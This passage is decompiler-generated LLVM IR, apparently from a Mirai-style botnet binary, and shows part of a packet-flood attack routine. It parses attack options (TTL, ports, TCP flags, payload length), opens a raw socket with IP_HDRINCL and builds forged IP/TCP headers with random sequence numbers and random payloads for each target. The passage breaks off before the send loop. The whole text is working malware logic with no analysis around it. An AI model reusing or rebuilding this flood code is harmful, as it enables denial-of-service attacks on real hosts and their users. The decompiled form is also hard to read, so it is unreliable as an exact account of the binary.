  store i32 0, i32* @sl, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_bbec = call i32 @calloc(i32 %arg2, i32 4)
  %v0_bbf0 = load i32, i32* @r4, align 4
  store i32 %v0_bbf0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_bbfc = load i32, i32* @sl, align 4
  store i32 %v0_bbfc, i32* %r3.global-to-local, align 4
  %v0_bc00 = load i32, i32* @r5, align 4
  store i32 %v0_bc00, i32* %r0.global-to-local, align 4
  %v5_bc04 = inttoptr i32 %v0_bbf0 to i32*
  %v6_bc04 = call i32 @attack_get_opt_int(i32 %v0_bc00, i32* %v5_bc04, i32 2, i32 %v0_bbfc)
  %v1_bc10 = urem i32 %v6_bc04, 256
  store i32 %v1_bc10, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bc1c = load i32, i32* @r4, align 4
  store i32 %v0_bc1c, i32* %r1.global-to-local, align 4
  %v0_bc20 = load i32, i32* @r5, align 4
  store i32 %v0_bc20, i32* %r0.global-to-local, align 4
  %v5_bc24 = trunc i32 %v6_bc04 to i8
  %v6_bc28 = inttoptr i32 %v0_bc1c to i32*
  %v7_bc28 = call i32 @attack_get_opt_int(i32 %v0_bc20, i32* %v6_bc28, i32 3, i32 65535)
  %v0_bc2c = load i32, i32* @r4, align 4
  store i32 %v0_bc2c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_bc3c = load i32, i32* @r5, align 4
  store i32 %v0_bc3c, i32* %r0.global-to-local, align 4
  %v5_bc40 = inttoptr i32 %v0_bc2c to i32*
  %v6_bc40 = call i32 @attack_get_opt_int(i32 %v0_bc3c, i32* %v5_bc40, i32 4, i32 64)
  %v1_bc48 = urem i32 %v6_bc40, 256
  store i32 %v1_bc48, i32* %ip.global-to-local, align 4
  %v0_bc4c = load i32, i32* @r4, align 4
  store i32 %v0_bc4c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_bc54 = load i32, i32* @sl, align 4
  store i32 %v0_bc54, i32* %r3.global-to-local, align 4
  %v0_bc58 = load i32, i32* @r5, align 4
  store i32 %v0_bc58, i32* %r0.global-to-local, align 4
  %v6_bc60 = inttoptr i32 %v0_bc4c to i32*
  %v7_bc60 = call i32 @attack_get_opt_int(i32 %v0_bc58, i32* %v6_bc60, i32 5, i32 %v0_bc54)
  %v1_bc6c = urem i32 %v7_bc60, 256
  store i32 %v1_bc6c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bc78 = load i32, i32* @r4, align 4
  store i32 %v0_bc78, i32* %r1.global-to-local, align 4
  %v0_bc7c = load i32, i32* @r5, align 4
  store i32 %v0_bc7c, i32* %r0.global-to-local, align 4
  %v5_bc84 = inttoptr i32 %v0_bc78 to i32*
  %v6_bc84 = call i32 @attack_get_opt_int(i32 %v0_bc7c, i32* %v5_bc84, i32 6, i32 65535)
  %v0_bc8c = load i32, i32* @r4, align 4
  store i32 %v0_bc8c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_bc84, i32* %fp.global-to-local, align 4
  %v0_bc9c = load i32, i32* @r5, align 4
  store i32 %v0_bc9c, i32* %r0.global-to-local, align 4
  %v4_bca0 = inttoptr i32 %v0_bc8c to i32*
  %v5_bca0 = call i32 @attack_get_opt_int(i32 %v0_bc9c, i32* %v4_bca0, i32 7, i32 65535)
  %v0_bca8 = load i32, i32* @r4, align 4
  store i32 %v0_bca8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v5_bca0, i32* %sb.global-to-local, align 4
  %v0_bcb8 = load i32, i32* @r5, align 4
  store i32 %v0_bcb8, i32* %r0.global-to-local, align 4
  %v4_bcbc = inttoptr i32 %v0_bca8 to i32*
  %v5_bcbc = call i32 @attack_get_opt_int(i32 %v0_bcb8, i32* %v4_bcbc, i32 16, i32 65535)
  %v0_bcc8 = load i32, i32* @r4, align 4
  store i32 %v0_bcc8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v0_bcd4 = load i32, i32* @r5, align 4
  store i32 %v0_bcd4, i32* %r0.global-to-local, align 4
  %v5_bcd8 = inttoptr i32 %v0_bcc8 to i32*
  %v6_bcd8 = call i32 @attack_get_opt_int(i32 %v0_bcd4, i32* %v5_bcd8, i32 17, i32 65535)
  %v0_bcdc = load i32, i32* @r4, align 4
  store i32 %v0_bcdc, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v0_bce8 = load i32, i32* @sl, align 4
  store i32 %v0_bce8, i32* %r3.global-to-local, align 4
  %v0_bcec = load i32, i32* @r5, align 4
  store i32 %v0_bcec, i32* %r0.global-to-local, align 4
  %v5_bcf0 = inttoptr i32 %v0_bcdc to i32*
  %v6_bcf0 = call i32 @attack_get_opt_int(i32 %v0_bcec, i32* %v5_bcf0, i32 10, i32 %v0_bce8)
  %v0_bcf4 = load i32, i32* @r4, align 4
  store i32 %v0_bcf4, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bd04 = load i32, i32* @r5, align 4
  store i32 %v0_bd04, i32* %r0.global-to-local, align 4
  %v5_bd08 = inttoptr i32 %v0_bcf4 to i32*
  %v6_bd08 = call i32 @attack_get_opt_int(i32 %v0_bd04, i32* %v5_bd08, i32 11, i32 1)
  %v0_bd0c = load i32, i32* @r4, align 4
  store i32 %v0_bd0c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v0_bd18 = load i32, i32* @sl, align 4
  store i32 %v0_bd18, i32* %r3.global-to-local, align 4
  %v0_bd1c = load i32, i32* @r5, align 4
  store i32 %v0_bd1c, i32* %r0.global-to-local, align 4
  %v5_bd20 = inttoptr i32 %v0_bd0c to i32*
  %v6_bd20 = call i32 @attack_get_opt_int(i32 %v0_bd1c, i32* %v5_bd20, i32 12, i32 %v0_bd18)
  %v0_bd24 = load i32, i32* @r4, align 4
  store i32 %v0_bd24, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_bd30 = load i32, i32* @sl, align 4
  store i32 %v0_bd30, i32* %r3.global-to-local, align 4
  %v0_bd34 = load i32, i32* @r5, align 4
  store i32 %v0_bd34, i32* %r0.global-to-local, align 4
  %v5_bd38 = inttoptr i32 %v0_bd24 to i32*
  %v6_bd38 = call i32 @attack_get_opt_int(i32 %v0_bd34, i32* %v5_bd38, i32 13, i32 %v0_bd30)
  %v0_bd3c = load i32, i32* @r4, align 4
  store i32 %v0_bd3c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v0_bd48 = load i32, i32* @sl, align 4
  store i32 %v0_bd48, i32* %r3.global-to-local, align 4
  %v0_bd4c = load i32, i32* @r5, align 4
  store i32 %v0_bd4c, i32* %r0.global-to-local, align 4
  %v5_bd50 = inttoptr i32 %v0_bd3c to i32*
  %v6_bd50 = call i32 @attack_get_opt_int(i32 %v0_bd4c, i32* %v5_bd50, i32 14, i32 %v0_bd48)
  %v0_bd54 = load i32, i32* @r4, align 4
  store i32 %v0_bd54, i32* %r1.global-to-local, align 4
  %v0_bd5c = load i32, i32* @sl, align 4
  store i32 %v0_bd5c, i32* %r3.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_bd64 = load i32, i32* @r5, align 4
  store i32 %v0_bd64, i32* %r0.global-to-local, align 4
  %v5_bd68 = inttoptr i32 %v0_bd54 to i32*
  %v6_bd68 = call i32 @attack_get_opt_int(i32 %v0_bd64, i32* %v5_bd68, i32 15, i32 %v0_bd5c)
  %v0_bd6c = load i32, i32* @r4, align 4
  store i32 %v0_bd6c, i32* %r1.global-to-local, align 4
  %v0_bd74 = load i32, i32* @sl, align 4
  store i32 %v0_bd74, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_bd7c = load i32, i32* @r5, align 4
  store i32 %v0_bd7c, i32* %r0.global-to-local, align 4
  %v5_bd80 = inttoptr i32 %v0_bd6c to i32*
  %v6_bd80 = call i32 @attack_get_opt_int(i32 %v0_bd7c, i32* %v5_bd80, i32 %v0_bd74, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bd8c = load i32, i32* @r4, align 4
  store i32 %v0_bd8c, i32* %r1.global-to-local, align 4
  store i32 %v6_bd80, i32* @r8, align 4
  %v0_bd94 = load i32, i32* @r5, align 4
  store i32 %v0_bd94, i32* %r0.global-to-local, align 4
  %v4_bd98 = inttoptr i32 %v0_bd8c to i32*
  %v5_bd98 = call i32 @attack_get_opt_int(i32 %v0_bd94, i32* %v4_bd98, i32 1, i32 1)
  %v2_bda4 = load i32, i32* @global_var_27164.91, align 4
  store i32 %v2_bda4, i32* %r3.global-to-local, align 4
  %v1_bda8 = urem i32 %v5_bd98, 256
  store i32 %v1_bda8, i32* %ip.global-to-local, align 4
  %v0_bdac = load i32, i32* @r4, align 4
  store i32 %v0_bdac, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_bdb4 = load i32, i32* @r5, align 4
  store i32 %v0_bdb4, i32* %r0.global-to-local, align 4
  %v5_bdbc = inttoptr i32 %v0_bdac to i32*
  %v6_bdbc = call i32 @attack_get_opt_ip(i32 %v0_bdb4, i32* %v5_bdbc, i32 24, i32 %v2_bda4, i32 %v1_bda8)
  %v0_bdc4 = load i32, i32* @sl, align 4
  store i32 %v0_bdc4, i32* %r0.global-to-local, align 4
  %v1_bdc8 = inttoptr i32 %v0_bdc4 to i32*
  %v2_bdc8 = call i32 @__GI_time(i32* %v1_bdc8)
  %v1_bdcc = load i32, i32* @r6, align 4
  %v2_bdcc = add i32 %v1_bdcc, %v2_bdc8
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_bde0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_bde0, i32* %r0.global-to-local, align 4
  %v7_bde4 = icmp eq i32 %v3_bde0, -1
  store i1 %v7_bde4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bde4, label %dec_label_pc_c2c8, label %dec_label_pc_bdf0

dec_label_pc_bdf0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bdf8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bdf8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_be00 = load i32, i32* @sl, align 4
  store i32 %v0_be00, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_be0c = call i32 @__GI_setsockopt(i32 %v3_bde0, i32 %v0_be00, i32 3, i32 %v6_bdf8, i32 4)
  store i32 %v5_be0c, i32* %r0.global-to-local, align 4
  %v7_be10 = icmp eq i32 %v5_be0c, -1
  store i1 %v7_be10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_be10, label %dec_label_pc_c2d4, label %dec_label_pc_be18

dec_label_pc_be18:                                ; preds = %dec_label_pc_bdf0
  store i32 %v7_bc28, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_be24 = load i32, i32* %fp.global-to-local, align 4
  %v0_be28 = load i32, i32* %sb.global-to-local, align 4
  %v3_be28 = mul i32 %v0_be28, 65536
  store i32 %v3_be28, i32* %sb.global-to-local, align 4
  %v3_be2c = urem i32 %v7_bc28, 65536
  store i32 %v3_be2c, i32* %r2.global-to-local, align 4
  %v3_be30 = urem i32 %v0_be24, 65536
  store i32 %v3_be30, i32* %r3.global-to-local, align 4
  %v3_be34 = urem i32 %v0_be28, 65536
  store i32 %v3_be34, i32* %ip.global-to-local, align 4
  %v2_be38 = icmp eq i32 %arg2, 0
  store i1 %v2_be38, i1* %cpsr_z.global-to-local, align 1
  %v0_be3c = load i32, i32* @sl, align 4
  store i32 %v0_be3c, i32* %stack_var_-44, align 4
  br i1 %v2_be38, label %dec_label_pc_c078.preheader, label %dec_label_pc_be50

dec_label_pc_be50:                                ; preds = %dec_label_pc_be18
  %v0_be60 = load i32, i32* @r8, align 4
  %v3_be60 = mul i32 %v0_be60, 65536
  %v1_be68 = add i32 %v3_be60, 2621440
  %tmp59 = mul i32 %v0_be24, 256
  %v3_be74 = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_be28, 256
  %v3_be78 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_be24, 256
  %v4_be80 = urem i32 %tmp61, 256
  %v5_be80 = or i32 %v4_be80, %v3_be74
  %tmp62 = udiv i32 %v1_be68, 256
  %v3_be84 = and i32 %tmp62, 65280
  %tmp63 = mul i32 %v7_bc28, 256
  %v3_be88 = and i32 %tmp63, 65280
  %tmp64 = udiv i32 %v0_be28, 256
  %v4_be8c = urem i32 %tmp64, 256
  %v5_be8c = or i32 %v4_be8c, %v3_be78
  store i32 %v5_be8c, i32* @fp, align 4
  %v4_be9c = udiv i32 %v1_be68, 16777216
  %v5_be9c = or i32 %v3_be84, %v4_be9c
  store i32 %v5_be9c, i32* @lr, align 4
  %tmp65 = udiv i32 %v7_bc28, 256
  %v4_bea0 = urem i32 %tmp65, 256
  %v5_bea0 = or i32 %v4_bea0, %v3_be88
  store i32 %v5_bea0, i32* @r5, align 4
  %tmp66 = mul i32 %v5_bcbc, 256
  %v3_beac = and i32 %tmp66, 65280
  %v1_beb0 = urem i32 %v6_bcf0, 2
  %v1_beb4 = urem i32 %v6_bd08, 2
  %tmp67 = udiv i32 %v5_bcbc, 256
  %v4_beb8 = urem i32 %tmp67, 256
  %v5_beb8 = or i32 %v4_beb8, %v3_beac
  %v1_bec4 = urem i32 %v6_bd20, 2
  store i32 %v1_bec4, i32* %r2.global-to-local, align 4
  %v1_bec8 = urem i32 %v6_bd38, 2
  store i32 %v1_bec8, i32* %r3.global-to-local, align 4
  store i32 %v6_bd50, i32* %ip.global-to-local, align 4
  store i32 %v6_bd68, i32* %r0.global-to-local, align 4
  store i32 %v6_bd20, i32* %r1.global-to-local, align 4
  %v1_bef0 = urem i32 %v6_bd50, 2
  store i32 %v1_bef0, i32* @sb, align 4
  store i32 %v0_be3c, i32* @r4, align 4
  %v1_bef8 = urem i32 %v6_bd20, 256
  store i32 %v1_bef8, i32* @r6, align 4
  %v1_befc = urem i32 %v6_bd68, 2
  store i32 %v1_befc, i32* @sl, align 4
  %v4_bf54 = sext i8 %v5_bc24 to i32
  %sext6 = mul nuw i32 %v5_be9c, 65536
  %v4_bf70 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_bea0, 65536
  %v4_bf78 = sdiv i32 %sext7, 65536
  %sext8 = mul nuw i32 %v5_be80, 65536
  %v4_bf94 = sdiv i32 %sext8, 65536
  %tmp = sub nsw i32 0, %v1_beb4
  %v4_bfe4 = and i32 %tmp, 16
  %tmp70 = sub nsw i32 0, %v1_bec4
  %v4_bff8 = and i32 %tmp70, 8
  %tmp71 = sub nsw i32 0, %v1_bec8
  %v4_c00c = and i32 %tmp71, 4
  %v1_bf64 = trunc i32 %v6_bc40 to i8
  br label %dec_label_pc_bf00

dec_label_pc_bf00:                                ; preds = %.thread10, %dec_label_pc_be50
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_bf0c = call i32 @calloc(i32 1510, i32 1)
  %v2_bf14 = load i32, i32* @r4, align 4
  %v5_bf14 = mul i32 %v2_bf14, 4
  %v6_bf14 = add i32 %v5_bf14, %v2_bbec
  %v7_bf14 = inttoptr i32 %v6_bf14 to i32*
  store i32 %v2_bf0c, i32* %v7_bf14, align 4
  %v3_bf18 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf18, i32* %r2.global-to-local, align 4
  %v5_bf20 = mul i32 %v3_bf18, 24
  %v1_bf24 = load i32, i32* @r7, align 4
  %v2_bf24 = add i32 %v1_bf24, %v5_bf20
  store i32 %v2_bf24, i32* %r0.global-to-local, align 4
  store i32 %v2_bbec, i32* %r3.global-to-local, align 4
  %v4_bf2c = mul i32 %v3_bf18, 4
  %v5_bf2c = add i32 %v4_bf2c, %v2_bbec
  %v6_bf2c = inttoptr i32 %v5_bf2c to i32*
  %v7_bf2c = load i32, i32* %v6_bf2c, align 4
  store i32 %v7_bf2c, i32* %r1.global-to-local, align 4
  %v1_bf30 = inttoptr i32 %v7_bf2c to i8*
  %v2_bf30 = load i8, i8* %v1_bf30, align 1
  %tmp72 = urem i8 %v2_bf30, 16
  %v1_bf34 = zext i8 %tmp72 to i32
  %v1_bf38 = or i32 %v1_bf34, 64
  store i32 %v1_bf38, i32* %r3.global-to-local, align 4
  %v1_bf3c = trunc i32 %v1_bf38 to i8
  store i8 %v1_bf3c, i8* %v1_bf30, align 1
  %v0_bf40 = load i32, i32* %r1.global-to-local, align 4
  %v1_bf40 = inttoptr i32 %v0_bf40 to i8*
  %v2_bf40 = load i8, i8* %v1_bf40, align 1
  %v1_bf44 = and i8 %v2_bf40, -16
  %v1_bf48 = or i8 %v1_bf44, 5
  store i32 %v1_bc6c, i32* %ip.global-to-local, align 4
  store i8 %v1_bf48, i8* %v1_bf40, align 1
  store i32 %v4_bf54, i32* %r2.global-to-local, align 4
  %v2_bf58 = load i32, i32* %r1.global-to-local, align 4
  %v3_bf58 = add i32 %v2_bf58, 1
  %v4_bf58 = inttoptr i32 %v3_bf58 to i8*
  store i8 %v5_bc24, i8* %v4_bf58, align 1
  store i32 %v1_bc48, i32* %r3.global-to-local, align 4
  %v0_bf60 = load i32, i32* %ip.global-to-local, align 4
  %v2_bf60 = icmp eq i32 %v0_bf60, 0
  store i1 %v2_bf60, i1* %cpsr_z.global-to-local, align 1
  %v2_bf64 = load i32, i32* %r1.global-to-local, align 4
  %v3_bf64 = add i32 %v2_bf64, 8
  %v4_bf64 = inttoptr i32 %v3_bf64 to i8*
  store i8 %v1_bf64, i8* %v4_bf64, align 1
  %v0_bf68 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bf68, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bf00
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_bf6c = load i32, i32* %r1.global-to-local, align 4
  %v4_bf6c = add i32 %v3_bf6c, 6
  %v5_bf6c = inttoptr i32 %v4_bf6c to i16*
  store i16 64, i16* %v5_bf6c, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bf00, %bb
  store i32 %v4_bf70, i32* %ip.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_bf78, i32* %r2.global-to-local, align 4
  %v2_bf7c = load i32, i32* %r1.global-to-local, align 4
  %v3_bf7c = add i32 %v2_bf7c, 9
  %v4_bf7c = inttoptr i32 %v3_bf7c to i8*
  store i8 6, i8* %v4_bf7c, align 1
  %v0_bf80 = load i32, i32* %ip.global-to-local, align 4
  %v1_bf80 = trunc i32 %v0_bf80 to i16
  %v2_bf80 = load i32, i32* %r1.global-to-local, align 4
  %v3_bf80 = add i32 %v2_bf80, 2
  %v4_bf80 = inttoptr i32 %v3_bf80 to i16*
  store i16 %v1_bf80, i16* %v4_bf80, align 2
  store i32 %v6_bdbc, i32* %ip.global-to-local, align 4
  %v1_bf88 = load i32, i32* %r1.global-to-local, align 4
  %v2_bf88 = add i32 %v1_bf88, 12
  %v3_bf88 = inttoptr i32 %v2_bf88 to i32*
  store i32 %v6_bdbc, i32* %v3_bf88, align 4
  %v0_bf8c = load i32, i32* %r2.global-to-local, align 4
  %v1_bf8c = trunc i32 %v0_bf8c to i16
  %v2_bf8c = load i32, i32* %r1.global-to-local, align 4
  %v3_bf8c = add i32 %v2_bf8c, 4
  %v4_bf8c = inttoptr i32 %v3_bf8c to i16*
  store i16 %v1_bf8c, i16* %v4_bf8c, align 2
  %v0_bf90 = load i32, i32* %r0.global-to-local, align 4
  %v1_bf90 = add i32 %v0_bf90, 16
  %v2_bf90 = inttoptr i32 %v1_bf90 to i32*
  %v3_bf90 = load i32, i32* %v2_bf90, align 4
  store i32 %v3_bf90, i32* %r2.global-to-local, align 4
  store i32 %v4_bf94, i32* %r0.global-to-local, align 4
  %v1_bf98 = load i32, i32* %r1.global-to-local, align 4
  %v2_bf98 = add i32 %v1_bf98, 16
  %v3_bf98 = inttoptr i32 %v2_bf98 to i32*
  store i32 %v3_bf90, i32* %v3_bf98, align 4
  %v0_bf9c = load i32, i32* %r0.global-to-local, align 4
  %v1_bf9c = trunc i32 %v0_bf9c to i16
  %v2_bf9c = load i32, i32* %r1.global-to-local, align 4
  %v3_bf9c = add i32 %v2_bf9c, 20
  %v4_bf9c = inttoptr i32 %v3_bf9c to i16*
  store i16 %v1_bf9c, i16* %v4_bf9c, align 2
  %v0_bfa0 = load i32, i32* %r1.global-to-local, align 4
  %v1_bfa0 = add i32 %v0_bfa0, 20
  store i32 %v1_bfa0, i32* @r4, align 4
  %v1_bfa4 = add i32 %v0_bfa0, 32
  %v2_bfa4 = inttoptr i32 %v1_bfa4 to i8*
  %v3_bfa4 = load i8, i8* %v2_bfa4, align 1
  %v4_bfa4 = zext i8 %v3_bfa4 to i32
  %v1_bfa8 = and i32 %v4_bfa4, 95
  store i32 %v1_bfa8, i32* %r3.global-to-local, align 4
  %v1_bfac = add i32 %v0_bfa0, 33
  %v2_bfac = inttoptr i32 %v1_bfac to i8*
  %v3_bfac = load i8, i8* %v2_bfac, align 1
  %v4_bfac = zext i8 %v3_bfac to i32
  store i32 %v4_bfac, i32* %r2.global-to-local, align 4
  %v1_bfb0 = or i32 %v1_bfa8, 80
  %v1_bfb4 = add i32 %v0_bfa0, 40
  store i32 %v1_bfb4, i32* @r5, align 4
  store i32 %v1_beb0, i32* %r1.global-to-local, align 4
  %v1_bfbc = trunc i32 %v1_bfb0 to i8
  store i8 %v1_bfbc, i8* %v2_bfa4, align 1
  store i32 %v5_beb8, i32* %r3.global-to-local, align 4
  %v0_bfc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bfc4 = and i32 %v0_bfc4, -33
  %v1_bfc8 = load i32, i32* %r1.global-to-local, align 4
  %v4_bfc8 = mul i32 %v1_bfc8, 32
  %v5_bfc8 = or i32 %v4_bfc8, %v1_bfc4
  store i32 %v5_bfc8, i32* %r2.global-to-local, align 4
  %v1_bfcc = load i32, i32* @r4, align 4
  %v2_bfcc = add i32 %v1_bfcc, 4
  %v3_bfcc = inttoptr i32 %v2_bfcc to i32*
  store i32 %v5_beb8, i32* %v3_bfcc, align 4
  %v0_bfd0 = load i32, i32* @fp, align 4
  %v1_bfd0 = trunc i32 %v0_bfd0 to i16
  %v2_bfd0 = load i32, i32* @r4, align 4
  %v3_bfd0 = add i32 %v2_bfd0, 2
  %v4_bfd0 = inttoptr i32 %v3_bfd0 to i16*
  store i16 %v1_bfd0, i16* %v4_bfd0, align 2
  %v0_bfd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bfd4 = trunc i32 %v0_bfd4 to i8
  %v2_bfd4 = load i32, i32* @r4, align 4
  %v3_bfd4 = add i32 %v2_bfd4, 13
  %v4_bfd4 = inttoptr i32 %v3_bfd4 to i8*
  store i8 %v1_bfd4, i8* %v4_bfd4, align 1
  %v0_bfd8 = load i32, i32* @r4, align 4
  %v1_bfd8 = add i32 %v0_bfd8, 13
  %v2_bfd8 = inttoptr i32 %v1_bfd8 to i8*
  %v3_bfd8 = load i8, i8* %v2_bfd8, align 1
  %v4_bfd8 = zext i8 %v3_bfd8 to i32
  store i32 %v1_beb4, i32* %ip.global-to-local, align 4
  %v1_bfe0 = and i32 %v4_bfd8, 239
  %v5_bfe4 = or i32 %v1_bfe0, %v4_bfe4
  store i32 %v5_bfe4, i32* %r3.global-to-local, align 4
  %v1_bfe8 = trunc i32 %v5_bfe4 to i8
  store i8 %v1_bfe8, i8* %v2_bfd8, align 1
  %v0_bfec = load i32, i32* @r4, align 4
  %v1_bfec = add i32 %v0_bfec, 13
  %v2_bfec = inttoptr i32 %v1_bfec to i8*
  %v3_bfec = load i8, i8* %v2_bfec, align 1
  %v4_bfec = zext i8 %v3_bfec to i32
  store i32 %v1_bec4, i32* %r0.global-to-local, align 4
  %v1_bff4 = and i32 %v4_bfec, 247
  %v5_bff8 = or i32 %v1_bff4, %v4_bff8
  store i32 %v5_bff8, i32* %r2.global-to-local, align 4
  %v1_bffc = trunc i32 %v5_bff8 to i8
  store i8 %v1_bffc, i8* %v2_bfec, align 1
  %v0_c000 = load i32, i32* @r4, align 4
  %v1_c000 = add i32 %v0_c000, 13
  %v2_c000 = inttoptr i32 %v1_c000 to i8*
  %v3_c000 = load i8, i8* %v2_c000, align 1
  %v4_c000 = zext i8 %v3_c000 to i32
  store i32 %v1_bec8, i32* %r1.global-to-local, align 4
  %v1_c008 = and i32 %v4_c000, 251
  %v5_c00c = or i32 %v1_c008, %v4_c00c
  store i32 %v5_c00c, i32* %r3.global-to-local, align 4
  %v1_c010 = trunc i32 %v5_c00c to i8
  store i8 %v1_c010, i8* %v2_c000, align 1
  %v0_c014 = load i32, i32* @r4, align 4
  %v1_c014 = add i32 %v0_c014, 13
  %v2_c014 = inttoptr i32 %v1_c014 to i8*
  %v3_c014 = load i8, i8* %v2_c014, align 1
  %v4_c014 = zext i8 %v3_c014 to i32
  %v1_c018 = and i32 %v4_c014, 253
  %v1_c01c = load i32, i32* @sb, align 4
  %v3_c01c = mul i32 %v1_c01c, 2
  %v4_c01c = or i32 %v3_c01c, %v1_c018
  store i32 %v4_c01c, i32* %r2.global-to-local, align 4
  %v1_c020 = trunc i32 %v4_c01c to i8
  store i8 %v1_c020, i8* %v2_c014, align 1
  %v0_c024 = load i32, i32* @r4, align 4
  %v1_c024 = add i32 %v0_c024, 13
  %v2_c024 = inttoptr i32 %v1_c024 to i8*
  %v3_c024 = load i8, i8* %v2_c024, align 1
  %v4_c024 = zext i8 %v3_c024 to i32
  %v1_c028 = and i32 %v4_c024, 254
  %v0_c02c = load i32, i32* @sl, align 4
  %v2_c02c = or i32 %v1_c028, %v0_c02c
  store i32 %v2_c02c, i32* %r3.global-to-local, align 4
  %v1_c030 = trunc i32 %v2_c02c to i8
  store i8 %v1_c030, i8* %v2_c024, align 1
  %v0_c034 = call i32 @rand_next()
  %v1_c034 = trunc i32 %v0_c034 to i16
  store i32 %v0_c034, i32* %r0.global-to-local, align 4
  %v0_c038 = load i32, i32* @r6, align 4
  %v2_c038 = icmp eq i32 %v0_c038, 0
  store i1 %v2_c038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c038, label %.thread10, label %bb68

bb68:                                             ; preds = %.thread
  %v1_c03c = load i32, i32* @r4, align 4
  %v2_c03c = add i32 %v1_c03c, 13
  %v3_c03c = inttoptr i32 %v2_c03c to i8*
  %v4_c03c = load i8, i8* %v3_c03c, align 1
  %v5_c03c = zext i8 %v4_c03c to i32
  %v2_c040 = or i32 %v5_c03c, 8
  store i32 %v2_c040, i32* %r3.global-to-local, align 4
  %v2_c044 = trunc i32 %v2_c040 to i8
  store i8 %v2_c044, i8* %v3_c03c, align 1
  br label %.thread10

.thread10:                                        ; preds = %.thread, %bb68
  %v3_c048 = load i32, i32* @r4, align 4
  %v4_c048 = add i32 %v3_c048, 14
  %v5_c048 = inttoptr i32 %v4_c048 to i16*
  store i16 %v1_c034, i16* %v5_c048, align 2
  %v0_c04c = load i32, i32* @r8, align 4
  store i32 %v0_c04c, i32* %r1.global-to-local, align 4
  %v0_c050 = load i32, i32* @r5, align 4
  store i32 %v0_c050, i32* %r0.global-to-local, align 4
  %v2_c054 = call i32 @rand_alphastr(i32 %v0_c050, i32 %v0_c04c)
  store i32 %v2_c054, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c05c = load i32, i32* @r5, align 4
  %v3_c05c = load i32, i32* @r8, align 4
  %v4_c05c = add i32 %v3_c05c, %v2_c05c
  %v5_c05c = inttoptr i32 %v4_c05c to i8*
  store i8 0, i8* %v5_c05c, align 1
  %v3_c060 = load i32, i32* %stack_var_-44, align 4
  %v1_c064 = add i32 %v3_c060, 1
  store i32 %v1_c064, i32* @r4, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v9_c06c = icmp eq i32 %v1_c064, %arg2
  store i1 %v9_c06c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c064, i32* %stack_var_-44, align 4
  %v5_c074 = icmp slt i32 %v1_c064, %arg2
  br i1 %v5_c074, label %dec_label_pc_bf00, label %dec_label_pc_c078.preheader

dec_label_pc_c078.preheader:                      ; preds = %.thread10, %dec_label_pc_be18
  %v2_c0b4 = icmp eq i32 %v6_bdbc, -1
  %v7_c0b4 = icmp eq i32 %v6_bdbc, -1
  %v3_c228 = icmp eq i32 %v3_be2c, 65535
  %v2_c28c = icmp eq i32 %v1_bda8, 0
  br label %dec_label_pc_c078

